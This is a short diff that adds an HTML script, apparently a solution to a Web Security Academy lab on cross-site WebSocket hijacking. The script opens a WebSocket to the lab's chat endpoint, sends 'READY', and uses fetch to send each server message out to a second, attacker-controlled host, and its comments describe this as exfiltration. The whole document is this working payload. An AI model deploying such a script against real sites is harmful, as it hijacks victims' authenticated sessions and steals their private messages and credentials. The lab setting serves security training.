@@ -1,0 +1,14 @@
+<script>
+websocket = new WebSocket('wss://acac1f6f1e255618806602c000a700cc.web-security-academy.net/chat')
+websocket.onopen = start
+websocket.onmessage = handleReply
+function start(event) {
+  // Observe how the WebSocket is initialized after handshake
+  // Client sends "READY" - Your payload must simulate the same
+  websocket.send("READY");
+}
+function handleReply(event) {
+  // When message received from server, exfiltrate it to your controlled site
+  fetch('https://acd81f451e0256008079039a013600d4.web-security-academy.net/?'+event.data, {mode: 'no-cors'})
+}
+</script> 
